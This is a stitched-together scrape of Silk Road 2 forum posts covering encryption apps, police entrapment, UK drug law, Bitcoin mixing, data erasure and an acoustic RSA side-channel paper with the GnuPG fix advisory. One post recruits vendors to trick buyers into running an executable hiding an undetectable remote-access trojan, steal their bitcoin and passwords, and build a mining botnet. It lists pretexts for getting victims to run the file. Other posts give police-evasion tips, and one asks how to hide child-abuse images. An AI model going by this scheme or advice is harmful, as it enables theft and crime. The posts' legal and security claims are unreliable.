I've come across a couple of apps which are android only at the moment but I know there are iPhone versions due out this summer.  They are both open source and use standard encryption techniques.  The first is TextSecure, it acts just like your normal text messaging app, except I prefer it anyway, if that's all you use if for, however if the other person has it then the message will be sent fully encrypted end to end. The messages are stored locally in an encrypted database which is locked when the phone is turned on and can be timed to lock after a timeout or manually locked. If there is no data available then an encrypted text message can be sent as an option (although this obviously leaves the trail with your provider).  The second is RedPhone which acts in a similar fashion except for calls. It acts as a normal dialer app except when the other person has it then you have the option for a fully encrypted phone call.  I would like to make it clear that I am in no way affiliated with Open Whisper Systems the people who maintain these apps but I use them both and thought that perhaps some others might think they are worth looking at",""

We are a small group of people always looking to expand, maybe you could become one of us.  Before you continue reading I want you to know that what we are doing is not whitehat. This is a highly efficient way to make a lot of money, if carried out properly. We have tested this method and proved it works.  What we are doing is basically stealing, we get a rat (remote administration tool) into people's systems and track down their bitcoin wallets or other storage platforms and transfer their btc to a long chain of other online addresses to make the btc untraceable and clean.  Now the reason why I am looking for blackmarket salesmen is because it guarantees that, the people who will be infected with the rat, actually have, or have knowledge of bitcoin.  If you decide to join us this is what I am going to want you to do:  I want you to make listings of products or use current listings to get costumers to download an exe. Now, the first problem that occurs is: Why would people run an exe? I thought about this a lot and came up with multiple possibilities:  - It could be an exe to aquire their Hardware ID's, which we need to prevent the spreading of ebooks and stuff and to organize our sales. (supposedly)  - The rat could be bound to silent miners, the customer will do the spreading for us. They will upload the miner to all their slaves, that way we could get a huge botnet.  - We could even make an off-site executable, that customers must run for your administration.  If you have any other ideas as to why your customer should run an executable, let me know.  With the rat, I will be able to get my hands on their passwords and files, so any encryption or obstacles will fail. It is also fully undetectable (FUD) and we will make sure it stays that way, by updating it.  If you are convinced you want to join us or have further question you can reach us by:   - Sending a PM - Skype: minerhansjeding - Torchat: hz4cfsp3yqqqjl2o - PGP: ",""

A seller on SR or other posts that they are looking for distributors and to buy larger volumes of their product at discount rates, so they can on sell the product  Is their any possibility that this original seller could be LE and tracks the packages they send out and follows it until it is in the hands of receiver and they keep further tabs until the receiver starts selling and places them under arrest as a drug supplier?   Obviously you couldn't prove where you got the drugs from farther than the deep web so couldn't even show that LE was in fact part of the conspiracy. The disadvantage to the police is that they are not catching actual high chain suppliers only people who wish to move up in the ranks as a distributor, but it is still possible and entirely feasible that LE are doing this correct? I mean it sounds ludicrous that police could be selling drugs on deep web markets but if it catches  distributors out it could be possible.

My original thought was classic entrapment also, however as you mentioned the prostitution example I remember watching cops(don't judge I was young and baked) and seeing people being busted for trying to solicit ""prostitutes"" but on some occasions it seemed like the police where very aggressive in their attempts to woo potential Jon's.  My thinking was that the police could not pay any credence to even being the original vendor setting up the bulk drop. It is all anonymous so a court room/judge would be none the wiser as to who sent the packages to be distributed. It would be a sneaky move by the police/DEA but its not like they don't have stockpiles of drugs they could use to develop the interest from seizures.  I just don't know what the powers etc the police have because I personally have never had to deal with them and have no intention of doing so. And its always so hard to find specific laws to states/counties etc coupled with the fact the police are so sneaky and will bend there own laws for an arrest",""

"Silk Road 2 Forums","Radius2000","34430","2014-04-02T21:14:12","Could LE be vendors","Discussion/Legal","I'll start by saying I'm not a lawyer so don't use my comments as a rule to live your life by    What you described is classed as entrapment. Here in the UK entrapment is illegal so could not be used as the basis for evidence in legal proceedings. Instead, the police would need to provide some other means as to how they caught you in the act... I'm 100% sure they do this, e.g. claiming they just got lucky doing a ""random"" spot check of parcels knowing full well what they would find.  Saying that,  entrapment is only deemed to have taken place if you can argue you were coerced into committing an illegal act by the police's actions. So, it's not considered entrapment if the police pretend to be a prostitute and catch a kerb crawler provided the kerb crawler instigated the (for want of a better word) transaction. If, conversely, the police officer purposely stopped someone and offered them sexual services then it would be classed as entrapment.  However, I think being on the darkweb would probably be sufficient for most judges to determine that you weren't coerced into doing something you hadn't already planned on doing with or without the police's intervention. I've not seen any cases surrounding entrapment on the darkweb so I really wouldn't like to put any money on which way it would go.  Other countries have different laws surrounding entrapment so the above may not be relevant at all in your country of residence.",""

"Silk Road 2 Forums","SupremeTeam","50234","2014-09-03T09:50:16","UK- Can police obtain search warrant on text messages alone? ","Discussion/Legal","It all depends on what your mate was arrested for and why they seized their phone.  If they had probable cause to seize their phone itâs because at the time of the arrest they felt that it was linked to the crime. Usually the officers on scene will briefly examine the phone to see if thereâs anything incriminating (messages/pictures).  Their phone(s) will then be investigated by the case officer to compile evidence (if any) and I assume he/she is currently on bail. When you get a chance to speak them ask them what they were charged with. If they are planning to investigate the phones then they will be bailed awaiting charge but their bail sheet will state the reason (e.g. concerned the supply of class x drugs).   If the phone is registered in their name/contracted then it will be easier for them to obtain records from their service provider. They also have the ability to retrieve deleted text messages (either from the service provider or some phones hold data even after you delete it). Although this would be only be used for more serious cases, as itâs usually not worth their time/resources/money for minor drug offenses.   Regarding your property being raided, it depends on what information they have (did you mention your address in the messages, are you connected in the case, do the conversations implicate you are a supplier, did your friend provide any information that could implicate you).    There are many factors to consider but if your mate didnât provide them with ANY information and they had a solicitor present during the interview then I would highly doubt they will be raiding your property.   With that being said, always use burners and rotate your numbers regularly. Text messages should never be used to talk about transactions, only to setup meets.   Best of luck to you and your friend.

","Discussion/Legal","hmmm  this will probably depend on the police force/unit in question, or whether there is a particular problem/target by police to tackle drugs in your area.  In a normal situation, normal cops, they will just deal with your mate as they see fit and use whatever evidence gathered from his phone as intelligence. I.e to record how/where drugs are being bought.   If this is a specialist drug unit or small force with little to do they may take it further. The above messages you mention will provide sufficient evidence for them to check who your phone company have listed against your phone. This is only a 'subscriber' check and doesn't really require any authority other than a senior officer.  And if your phone is registered to you then they will find who you are and where you live from the phone company.  If its not registered to you then this is probably where the investigation will stop. They could check location of top ups and check cctv at those locations and identifiy you that way, or if you topped up with a bank card check with your bank (again only senior officer authority needed).  This again will depend on the police area or unit.  With regards to obtaining text messages only orange keeps them for longer than 48hours so if you're not with orange you'll be OK. but having said that an interception warrant (this is needed to get your messages) is a much higher authority and needs the home secretary to sign, so unless you and your mate are up to some pretty serious shit, I doubt they'd take your case to the home secretary.  If your phone isn't registered to you and you only top up with cash at none cctv shops then you'll be more than safe even if they want to they would struggle to find you.  But....more than likely they'll be satisfied if they charge your mate and get their crime marked as solved. Funny how police make the crime to solve it.   As other commentors suggest the main problem you have is your mate, if he stands charged and is facing time, he may rat you out to get less.

","Discussion/Legal"," So long as you've learned from it pal, that's the main thing. I think it's laughable that the police would spend do much time investigating a none crime when there are so many real crimes occurring.   I wonder how much money the LE in US spent investiagting and closing SR1, and for what? It's back and others have emerged too.  It will take a while but we will win the real war on drugs.  I think in decades to come the procedure of prosecution and criminalisation for drug related offences will be looked upon as a dark era for LE ruining lives to hit government targets.

If it is simply texts only, especially what you've quoted then I'd be amazed if they do. They have to put this evidence to a Magistrate to sign off and its unlikely on text only.

I am not a big dealer i get a half lb of weed here and their maybe once a month or once every 2 months. My address is never mentioned over texts or phone calls for that matter but the messages came from my personal contract phone that i only use for family and friends but being relaxed for a few weeks their i had a number of conversations with my friend in question from the personal phone. One of the last messages was about me helping him get rid of stuff once he got it in ( so looks more like i am a buyer from that one ) It has been just over 2 weeks so i would assume if they were going to raid me it would have happened by now? You would assume that they would do it as quick as possible. Yes he was released for intent to supply:(","It all depends on what your mate was arrested for and why they seized their phone.If they had probable cause to seize their phone itâs because at the time of the arrest they felt that it was linked to the crime. Usually the officers on scene will briefly examine the phone to see if thereâs anything incriminating (messages/pictures).Their phone(s) will then be investigated by the case officer to compile evidence (if any) and I assume he/she is currently on bail. When you get a chance to speak them ask them what they were charged with. If they are planning to investigate the phones then they will be bailed awaiting charge but their bail sheet will state the reason (e.g. concerned the supply of class x drugs). If the phone is registered in their name/contracted then it will be easier for them to obtain records from their service provider. They also have the ability to retrieve deleted text messages (either from the service provider or some phones hold data even after you delete it). Although this would be only be used for more serious cases, as itâs usually not worth their time/resources/money for minor drug offenses. Regarding your property being raided, it depends on what information they have (did you mention your address in the messages, are you connected in the case, do the conversations implicate you are a supplier, did your friend provide any information that could implicate you).  There are many factors to consider but if your mate didnât provide them with ANY information and they had a solicitor present during the interview then I would highly doubt they will be raiding your property. With that being said, always use burners and rotate your numbers regularly. Text messages should never be used to talk about transactions, only to setup meets. Best of luck to you and your friend."

I included the full abstract as well.  Abstract    Many computers emit a high-pitched noise during operation, due to vibration in some of their electronic components. These acoustic emanations are more than a nuisance: they can convey information about the software running on the computer, and in particular leak sensitive information about security-related computations. In a preliminary presentation (Eurocryptâ04 rump session), we have shown that different RSA keys induce different sound patterns, but it was not clear how to extract individual key bits. The main problem was that the acoustic side channel has a very low bandwidth (under 20 kHz using common microphones, and a few hundred kHz using ultrasound microphones), many orders of magnitude below the GHz-scale clock rates of the attacked computers.    In this paper we describe a new acoustic cryptanalysis key extraction attack, applicable to GnuPGâs current implementation of RSA. The attack can extract full 4096-bit RSA decryption keys from laptop computers (of various models), within an hour, using the sound generated by the computer during the decryption of some chosen ciphertexts. We experimentally demonstrate that such attacks can be carried out, using either a plain mobile phone placed next to the computer, or a more sensitive microphone placed 4 meters away.    Beyond acoustics, we demonstrate that a similar low-bandwidth attack can be performed by measuring the electric potential of a computer chassis. A suitably-equipped attacker need merely touch the target computer with his bare hand, or get the required leakage information from the ground wires at the remote end of VGA, USB or Ethernet cables.      Mobile phone hack:  This can make cellphone interception impractical.  Firstly, this limits the application to a certian subset of computer and laptops.  The target needs a cpu that produces less audio than than 24 kHz.  It limits the number of computers that are vaunerable.  Next, there are certains conditions neccessary to succesfully capturing the audio.  The phone needs to be facing the computers fans.  It also has to be in range.    They were able to extract a keys sucesfully in their experiment, but there were certain restrictions; the phone had to be 30 cm away and at designated and it only works for certain target laps.  They were able successfully use this strategy with the following laptops Lenovo ThinkPad X300 and ThinkPad T23.  Here was there specfic setup for sucessful results:   Succesfull mobile attack:   Portable Attack: Their setup isn't practical at all.  It requires lots a precise equipment aimed correctly. Additionally, they used a laptop.  Check out the picture yourself.  Its Fig.3  I don't know how to upload pics.  Trust me its not discrete at all.  Although, it can hear noise up to 100Khz so it would be applicable to more devices (than mobile phone approach).  They used a Lenovo ThinkPad T61 for this setup.  This computer was not compatiable with the mobile phone attack. ","   In this setup, we try to use the most ubiquitous compact hardware that is readily available to everypotential attacker: a mobile phone (see Figure 4). The small size and low cost come at the cost oflow quality microphones and amplifiers, that are not designed for the signal frequencies and amplitudessought by the attack.We used several Android phones, with similar results: HTC Sensation, Samsung Galaxy S II andSamsung Galaxy Note II. Recording was done by a custom Android app, accessing the internal microphone. The specifications of the microphone, amplification, filtering and A2D hardware were notavailable to us. We observe that sensitivity is lower, and noise is higher than in the above setups. Frequencyresponse is also very limited: upper bounded by the 24 kHz Nyquist frequency (48 kS/s samplerate), and in practice much lower due to transducer and filter design (recall that cellular speech codecsfilter out audio beyond 4 kHz).;   Indeed, some machines, such as the Lenovo ThinkPad X300 and ThinkPad T23, exhibit useful leakageat lower leakage frequency, 15â22 kHz (i.e., within audible range).....   Lowering the leakage frequency also allows us to use lower quality microphones [certian laptops have lower leakage]such as the ones present in smartphones. As described in Section 2.3, we used mobile phones to performthe attack. Due to the lower signal-to-noise ratio and frequency response of the phoneâs internal microphone,our attack is limited in frequency (about 24 kHz) and in range (about 30 centimeters). However,it is still possible to perform it on certain target computers, simply by placing the phoneâs microphonenear to and directed towards the fan exhaust vent of the target while running the attack (see Figure 4).Unlike previous setups, all that is required from the attacker in order to actually mount the attack is todownload a suitable application to the phone, and place it appropriately near the target computer. Nospecial equipment is required to perform the attack.27;   We built an alternative setup that is portable (fits in a briefcase) and battery-operated, yet maintains excellentsensitivity and noise up to 100 kHz. To do so, we kept the BrÃ¼el&KjÃ¦r capsules and preamplifier,but replaced the power, amplification and analog-to-digital components. See Figure 3.Here, the microphone power, amplification and some filtering are done by an integrated, batteryoperatedBrÃ¼el&KjÃ¦r 5935 microphone power supply. After a self-built 10 kHz RC low-pass filter cascadedwith a 150 kHz RC high-pass, analog-to-digital-conversion is done by the compact, USB-operatedNational Instruments MyDAQ device. The MyDAQ device captures at 200 Ksample/sec, and is thusNyquist-limited to 100 kHz.4 The BrÃ¼el&KjÃ¦r 5935 amplifier is likewise limited to a frequency of100 kHz. We later show that this often suffices for the attack."

Along with the publication of an interesting new side channel attack by Daniel Genkin, Adi Shamir, and Eran Tromer we announce the availability of a new stable GnuPG release to relieve this bug: Version 1.4.16.  This is a *security fix* release and all users of GnuPG versions 1.x are advised to updated to this version.    GnuPG versions 2.x are notaffected.  See below for the impact of the problem.   The GNU Privacy Guard (GnuPG) is GNU's tool for secure communication and data storage.  It is a complete and free replacement of PGP and can be used to encrypt data and to create digital signatures.  It includes an advanced key management facility, smartcard support and is compliant with the OpenPGP Internet standard as described by RFC-4880.  Note that this version is from the GnuPG-1 series and thus smaller than those from the GnuPG-2 series, easier to build, and also better portable to ancient platforms.  In contrast to GnuPG-2 (e.g version 2.0.22) it comes with no support for S/MIME, Secure Shell, or other tools useful for desktop environments.  Fortunately you may install both versions alongside on the same system without any conflict.   What's New ===========   * Fixed the RSA Key Extraction via Low-Bandwidth Acoustic    Cryptanalysis attack as described by Genkin, Shamir, and Tromer.    See <http://www.cs.tau.ac.il/~tromer/acoustic/>.  [CVE-2013-4576]   * Put only the major version number by default into armored output.   * Do not create a trustdb file if --trust-model=always is used.   * Print the keyid for key packets with --list-packets.   * Changed modular exponentiation algorithm to recover from a small    performance loss due to a change in 1.4.14.   Impact of the security problem ==============================  CVE-2013-4576 has been assigned to this security bug.  The paper describes two attacks.  The first attack allows to distinguish keys: An attacker is able to notice which key is currently used for decryption.  This is in general not a problem but may be used to reveal the information that a message, encrypted to a commonly not used key, has been received by the targeted machine.  We do not have a software solution to mitigate this attack.  The second attack is more serious.  It is an adaptive chosen ciphertext attack to reveal the private key.  A possible scenario is that the attacker places a sensor (for example a standard smartphone) in the vicinity of the targeted machine.  That machine is assumed to do unattended RSA decryption of received mails, for example by using a mail client which speeds up browsing by opportunistically decrypting mails expected to be read soon.  While listening to the acoustic emanations of the targeted machine, the smartphone will send new encrypted messages to that machine and re-construct the private key bit by bit.  A 4096 bit RSA key used on a laptop can be revealed within an hour.  GnuPG 1.4.16 avoids this attack by employing RSA blinding during decryption.  GnuPG 2.x and current Gpg4win versions make use of Libgcrypt which employs RSA blinding anyway and are thus not vulnerable.  For the highly interesting research on acoustic cryptanalysis and the details of the attack see http://www.cs.tau.ac.il/~tromer/acoustic/ .    Getting the Software ====================  First of all, decide whether you really need GnuPG version 1.4.x - most users are better off with the modern GnuPG 2.0.x version.  Then follow the instructions found at http://www.gnupg.org/download/ or read on:  GnuPG 1.4.16 may be downloaded from one of the GnuPG mirror sites or direct from ftp://ftp.gnupg.org/gcrypt/ .  The list of mirrors can be found at http://www.gnupg.org/mirrors.html .  Note, that GnuPG is not available at ftp.gnu.org.  On the mirrors you should find the following files in the *gnupg* directory:    gnupg-1.4.16.tar.bz2 (3571k)   gnupg-1.4.16.tar.bz2.sig        GnuPG source compressed using BZIP2 and OpenPGP signature.    gnupg-1.4.16.tar.gz (4955k)   gnupg-1.4.16.tar.gz.sig        GnuPG source compressed using GZIP and OpenPGP signature.    gnupg-1.4.15-1.4.15.diff.bz2 (26k)        A patch file to upgrade a 1.4.15 GnuPG source tree.  This patch       does not include updates of the language files.  Select one of them. To shorten the download time, you probably want to get the BZIP2 compressed file.  Please try another mirror if exceptional your mirror is not yet up to date.  In the *binary* directory, you should find these files:    gnupg-w32cli-1.4.16.exe (1573k)   gnupg-w32cli-1.4.16.exe.sig        GnuPG compiled for Microsoft Windows and its OpenPGP signature.       This is a command line only version; the source files are the same       as given above.  Note, that this is a minimal installer and unless       you are just in need for the gpg binary, you are better off using       the full featured installer at http://www.gpg4win.org .  Gpg4win       uses GnuPG 2.x and is thus not affected by the security bug.   Checking the Integrity ======================  In order to check that the version of GnuPG which you are going to install is an original and unmodified one, you can do it in one of the following ways:   * If you already have a trusted version of GnuPG installed, you    can simply check the supplied signature.  For example to check the    signature of the file gnupg-1.4.16.tar.bz2 you would use this command:       gpg --verify gnupg-1.4.16.tar.bz2.sig     This checks whether the signature file matches the source file.    You should see a message indicating that the signature is good and    made by that signing key.  Make sure that you have the right key,    either by checking the fingerprint of that key with other sources    or by checking that the key has been signed by a trustworthy other    key.  Note, that you can retrieve the signing key using the command       finger wk ,at' g10code.com | gpg --import     or using a keyserver like       gpg --recv-key 4F25E3B6     The distribution key 4F25E3B6 is signed by the well known key    1E42B367.  If you get an key expired message, you should retrieve a    fresh copy as the expiration date might have been prolonged.     NEVER USE A GNUPG VERSION YOU JUST DOWNLOADED TO CHECK THE    INTEGRITY OF THE SOURCE - USE AN EXISTING GNUPG INSTALLATION!   * If you are not able to use an old version of GnuPG, you have to verify    the SHA-1 checksum.  Assuming you downloaded the file    gnupg-1.4.16.tar.bz2, you would run the sha1sum command like this:       sha1sum gnupg-1.4.16.tar.bz2     and check that the output matches the first line from the    following list:  0bf5e475f3eb6f33d5474d017fe5bf66070e43f4  gnupg-1.4.16.tar.bz2 ea40324a5b2e3a16ffb63ea0ccc950a3faf5b11c  gnupg-1.4.16.tar.gz ead70b47218ba76da51c16b652bee2a712faf2f6  gnupg-1.4.15-1.4.16.diff.bz2 82079c7c183467b4dd3795ca197983cd2494cec4  gnupg-w32cli-1.4.16.exe   Internationalization ====================  GnuPG comes with support for 29 languages.  The Chinese (Simple and Traditional), Czech, Danish, Dutch, French, German, Norwegian, Polish, Romanian, Russian, Spanish, Swedish, Ukrainian, and Turkish translations are close to be complete.   Support =======  A listing with commercial support offers for GnuPG is available at:    http://www.gnupg.org/service.html  The driving force behind the development of GnuPG is the company of its principal author, Werner Koch.  Maintenance and improvement of GnuPG and related software take up a most of their resources.  To allow them continue their work they ask to either purchase a support contract, engage them for custom enhancements, or to donate money:    http://g10code.com/gnupg-donation.html    Thanks ======  We have to thank all the people who helped with this release, be it testing, coding, translating, suggesting, auditing, donating money, spreading the word, or answering questions on the mailing lists.  Many thanks to Eran Tromer for providing early drafts of the paper and testing the fixes.    Happy Hacking,    The GnuPG Team    -- Die Gedanken sind frei.  Ausnahmen regelt ein Bundesgesetz. -------------- next part -------------- A non-text attachment was scrubbed... Name: not available Type: application/pgp-signature Size: 204 bytes Desc: not available URL: </pipermail/attachments/20131218/e2b200d7/attachment.sig>  My analysis:   This attack primarily would be used against machines used as servers, dedicated to performing PGP encryption, and performing no other functions.  Almost no one here would be using their machines in such a manner.   Preliminary experiments with 1.4.16 have shown that it may break the Seahorse gedit plugin.

Where security differs from religion is that security is NOT retroactive.  Unlike Christianity, where you can come to Jesus, be 'saved' and have all  your sins washed away, with security you can adopt Tails or PGP, and be  secure from that point forward, but rest assured that your previous sins  (security failings) WILL come back to haunt you and bite you in the ass.  The original DPR is the poster child for that, right now.  Folly, thou conquerest, and I must yield! Against stupidity the very gods Themselves contend in vain.      --Friedrich Schiller   ",""

A few months ago, I stumbled across Hakim Bey's Temporary Autonomous Zones paper from the 90's.. his entire concept of spaces that temporarily exist outside formal structures of control kinda struck a chord with me.  I've enjoyed this TAZ, like I enjoyed SRF v1.  I may decide to put together a small, private (but not trustably private, just to set expectations) community for the discussion of anonymity technology.  It'll involve smart people, and probably a few Feds by accident, as those sorts of things always do.   Drop me a line if you're interested in participating.  May be checking PMs here for a bit, but may not.  YMMV.  For those of you who I've enjoyed discussions with, please take care of yourselves.  You guys do some crazy shit that's well beyond my own personal appetite for risk, and I wish you the best.

here.   Fucking again.  It's hard to find a venue to safely and anonymously discuss anonymity technologies.. they always end up being attached to places that first-world LE tends to kick the door in on way too often.A few months ago, I stumbled across Hakim Bey's Temporary Autonomous Zones paper from the 90's.. his entire concept of spaces that temporarily exist outside formal structures of control kinda struck a chord with me.  I've enjoyed this TAZ, like I enjoyed SRF v1.I may decide to put together a small, private (but not trustably private, just to set expectations) community for the discussion of anonymity technology.  It'll involve smart people, and probably a few Feds by accident, as those sorts of things always do.   Drop me a line if you're interested in participating.  May be checking PMs here for a bit, but may not.  YMMV.For those of you who I've enjoyed discussions with, please take care of yourselves.  You guys do some crazy shit that's well beyond my own personal appetite for risk, and I wish you the best.If anyone wants to get in contact with me in the future, please excuse my not providing a link to a Facebook profile.   Instead, post a message, encrypted to my public key here (included below), to alt.anonymous.messages using a hsub in the subject using the passphrase ""whom@whom.whom"".   If you can't figure out how to do that, we're probably not missing out on any conversations.   (mixmaster + a mail2news gateway is a decent place to start, and http://mixnym.net/hsub.html explains HSubs). -whom     -----BEGIN PGP PUBLIC KEY

There were plenty of people piling on the dumbass train after the Ulbricht arrest at SRFv1.  If someone *wasn't* accused of being a Fed in that week, it was just an oversight on the part of the lynch mob of terrified pitchfork-wielding posters.     I like your forum idea.. my goal is slightly different.. primarily to get a small group of folks together to discuss anonymity technology, and if it stays small, I'm kinda good with that.  Over time, people invite folks they know not to be idiots, and it just kinda rocks along.     I love anonymous group discussion, so if you, or someone else, can build a forum to foster the kind of discussion we all enjoyed at SRFv1 (and here), and keep that forum well shy of the line where somebody kicks the door in, that sounds fantastic.   My concern is that in today's weird assed legal environment, I have no clue where that line is.   But I think what you're suggesting is basically a small darknet version of what some of reddit's subforums are doing, and they're still alive on clearnet.

It's not just about security. I would like to have a forum with a variety of subforums, including security, drug safety, law, philosophy, and review forums for the various markets. There would be no Product Requests and Product Offers sections, so no drug deals and no drug advertising. Nothing illegal. Just chat about security, drug safety, law, etc, and market reviews.I think a forum dedicated solely to security and technology wouldn't draw a lot of people. The review subforums would draw them in, especially since the could look through reviews of many markets at once and it would be a reliable place to go when markets disappear or scam out. That would bring the critical mass of users to make the security forum a thriving place."

I think you're getting a little mixed up with the whole encryption thing. If you need additional space for your encrypted files, use a 16GB or even a 32GB USB flash drive instead of an 8GB one to run Tails from. 16GB - 32GB is a lot of encrypted files to keep on you, believe me. Just use a new, bigger 16GB or 32GB USB drive to ""clone and upgrade"" from your 8GB one when the next version of Tails is released very soon. That way it will copy your existing Persistent Volume Folder onto the new drive, saving you the hassle of having to add it manually if you chose the option to ""clone and install."" You can keep a tonne of documents, literally thousands and thousands of A4 pages filled with information, in the Persistent Volume on a USB drive if it has a capacity in the range of 16Gb - 32GB. You don't have to encrypt all your files In my opinion, only information which is Tor related and you want to remain private or anything which may incriminate you. I'm not sure why you would need to be encrypting any .jpg files as these are just photos which are only important to yourself.  When encrypting your files with PGP, you only need to do it once and they will be secure for decades to come, as long as you have used RSA keys with a strength of 4096 bits. They won't be crackable until around the year 2040+ according to the NSA. As long as you have used a strong passphrase for your Private PGP Key, no one will be able to access the encrypted data held within those messages for a very long time. You could encrypt your 180GB HDD with FDE (Full Disk Encryption), and use software like Tc-play or you could still use TrueCrypt 7.1a, which is probably fine pending the outcome of the security audit currently being undertaken. Version 7.2a of Truecrypt seems now to be compromised and should never be used.    ","Quote from: The Jigsaw Puzzle on July 04, 2014, 02:43:19 pmI'm not sure what you are trying to do?

PGP  is only used for documentation such as emails, messages, etc. If  you want to store photos and malicious software, you'll need to keep them on your HDD and encrypt it (FDE) with Truecrypt 7.1a (NOT the latest version 7.2a). You could then store the most sensitive things in Hidden Volumes for added security. You can encrypt any documents you have with PGP and then add them to your encrypted HDD, giving them an added layer of protection.",""

","I'm not sure what you are trying to do? Yes, you can boot from Tails on a USB and still see another USB if it's plugged in to one of the spare USB ports on your PC. Just go > Start > Places > and look for the USB drive. Why would you want to encrypt files in one USB drive and boot from the other one? Just click on CLONE and INSTALL to copy Tails from the USB you booted from onto the other USB (formatted and wiped clean). You will need to add a Persistent Volume to the USB manually though if you choose this route as this method just copies the Tails OS.The best method of encrypting your own files is to encrypt them using PGP.

"Silk Road 2 Forums","Eifi","45132","2014-07-04T23:50:42","[Resolved] Problem regarding Tails ","Discussion/Security","  Well yeah I bet I mixed up... I never heard of PgP before coming on SR but here in a clear version what I would like to do, not matter the reason (no offend, it's just that I don't have real reason, just knowing how to do that , for self knowledge) , it's just training to know how to do this ( basically I wanna learn :p )  I would like to encrypt files like .jpg or .exe  Here some exemple (   PLEASE  be aware that it is just   exemple  I take because they are obvious reason you would like to use encryption, don't think that I actually use these things and don't judge me based only on this post ! Thanx )  I read on a thread a ""famous"" group of hacktivism pedophilia-related , so let say I'm one of this guys, obviously I want to encrypt all my images of you know what. So that's why I would like to use Pgp on .jpg , to encrypt the illegal picture I have on my disk. Or other method of encryption for these files  Now take an other situation where I am a part of a big hacker groupe , I would probably like to encrypt the malware and other trojan I created, or at least the place where they are located ( so FDE obviously )    Now it sound maybe crazy but you know I take literraly the sentence "" better safe than sorry "" , So what if I would like to FDE my HD where all the illegal shit are , and then encrypt each files itself , so even if a Cop come and decrypt my HD , he will have to decrypt once again each files one after an other...  So PGP I guess , if it works on .exe and other type of files.     Sorry for taking so much of your time , but in fact , as I said above, it's just that I want to learn the maximum I can , just for self-culture, and because I think the more I know , the safier I could be. ","No need to apologize about your English mate, I bet if I was trying to communicate in your native language, I'd be worse than you are at English.  I think you're getting a little mixed up with the whole encryption thing. If you need additional space for your encrypted files, use a 16GB or even a 32GB USB flash drive instead of an 8GB one to run Tails from. 16GB - 32GB is a lot of encrypted files to keep on you, believe me. Just use a new, bigger 16GB or 32GB USB drive to ""clone and upgrade"" from your 8GB one when the next version of Tails is released very soon. That way it will copy your existing Persistent Volume Folder onto the new drive, saving you the hassle of having to add it manually if you chose the option to ""clone and install."" You can keep a tonne of documents, literally thousands and thousands of A4 pages filled with information, in the Persistent Volume on a USB drive if it has a capacity in the range of 16Gb - 32GB.You don't have to encrypt all your files In my opinion, only information which is Tor related and you want to remain private or anything which may incriminate you. I'm not sure why you would need to be encrypting any .jpg files as these are just photos which are only important to yourself.When encrypting your files with PGP, you only need to do it once and they will be secure for decades to come, as long as you have used RSA keys with a strength of 4096 bits. They won't be crackable until around the year 2040+ according to the NSA. As long as you have used a strong passphrase for your Private PGP Key, no one will be able to access the encrypted data held within those messages for a very long time. You could encrypt your 180GB HDD with FDE (Full Disk Encryption), and use software like Tc-play or you could still use TrueCrypt 7.1a, which is probably fine pending the outcome of the security audit currently being undertaken. Version 7.2a of Truecrypt seems now to be compromised and should never be used.   "

Remember that everything I will type may have changed so take it as a grain of salt until you do research to see if this information is still up to date!  1.--- Crack, Coke, MDMA, H, LSD, shrooms, methadone, and crystal are all class A drugs. (or class 1). Up to 7 years and unlimited fine can be applicable to who ever posseses it. For making it i think it is life in the brink and unlimited fine.   2a---, Cannabis and all cannabinoids are class B (class2). Up to 5 years and unlimited fine for possesion. Production is up to 15 (i think) years. It has changed recently if i am not mistaken.  2b---, Police can fine you up to 90 pounds on the spot for canabis. I think they confinscate it too.  2c--- I remember it being under 1oz.(cannabis) I could be very wrong. Research this one yourself.   3..Mix of drugs can result in being charged for all 3.  4. Harder drugs will probably not have a ""personal amount"" associated with it. Again, check this yourself as i am not sure.  The important thing to remember is your penalty will be bassed on class and quantity of drug, where you and the drugs were found, personal history, if you obstruct the police during the arrest, and if the judge wants to break your balls. I do not know for sure how getting caught in your home vs getting caught outside would play out though. I bet if you have small children at your home and are caught with drugs in the house then the fine or penalty will be greater.   Hope this helps!   p.s. Remember every drug related charge is dealt with differently. If you have a clean reccord then getting charged with distribution is a much lower chance.  ",""

Right now, when two inputs are combined to create a single output (called a ""transaction"") it is assumed that those inputs belong to the same wallet/ are controlled by one person.  However, that assumption is not necessarily correct.  Inputs can come from any source and can be spent as outputs to any address(es) controlled by one or more wallets.  Basically what coinjoin does is it uses multiple signature transaction logic to join payments together so they look like they are coming from the same source when they are not.  If enough transactions are done this way it becomes impossible to know who is sending what inputs as outputs to what addresses.  If darkwallet succeeds in implementing coinjoin and is widely adopted it will make bitcoin payments impossible to trace, and will do away with the need for mixing services, because all, or most, transactions will be ""mixed"", though not in the same ways Fog or blockchain use.

"Silk Road 2 Forums","Jeks","176","2013-10-10T03:34:58","Astor: Secure data erasure, a professional analysis","Discussion/Security","Another old SRF:  Title: Secure data erasure, a professional analysis Post by: astor on January 03, 2013, 03:29 am This is a professional analysis of secure data erasure. It comes from the Center for Magnetic Recording Research. It clearly sates that multiple writes are no more effective than a single write (I highlight the comments in the text). Full analysis is here: http://cmrr.ucsd.edu/people/Hughes/DataSanitizationTutorial.pdf  TL;DR  Physical destruction is the most secure data erasure method, but surprisingly, ""simply bending a disk makes  [data recovery] nearly impossible.""  Data Sanitization in Hard Disk Drives  Four basic sanitization security levels can be defined: weak erase (deleting files), block erase (overwrite by external software), normal secure erase (current drives), and enhanced secure erase (see below). The CMRR at UCSD has established test protocols for software secure erase.  Block erase is most commonly used. While it is significantly better than no erase, or file deletion, or drive formatting, it is vulnerable to malware and incomplete erasure of all data blocks. Examples are data blocks reassigned by drives, multiple drive partitions, host protected areas, device configuration overlays, and drive faults.  Normal secure erase is approved by NIST 800-88 for legal sanitization of user data up to Confidential, and enhanced secure erase for higher levels. Enhanced level has only recently been implemented, initially in Seagate drives, and these drives are under evaluation by the CMRR.  These four erasure protocols exist because users make tradeoffs between sanitization security level and the time required. A high security protocol that requires special software and days to accomplish will be avoided by most users, making it little used and of limited practical value. For example, the old data overwrite document DoD 5220 calls for multiple block overwrites of Confidential data, which can take more than a day to complete in today's large capacity drives. So users make tradeoffs between the time required to erase data and the risk that the next drive user may know and use recovery techniques which can access weakly erased data.  For all but top-secret information, users will usually turn to erasure methods that take minutes rather than hours or days. They will select a method that gives them an acceptable level of security in a reasonable time window.  Physical Drive Destruction  To positively prevent data from recovery, disks can be removed from disk drives and broken up, or even ground to microscopic pieces. (Actually, simple disk bending is highly effective, particularly in emergency situations.) Obsolete government document DoD 5220 required physical destruction of the storage medium (the magnetic disks) for data classified higher than Secret. Even such physical destruction is not absolute if any remaining disk pieces are larger than a single 512-byte record block in size, about 1/125"" in today's drives. As linear and track densities increases, the maximum allowable size of 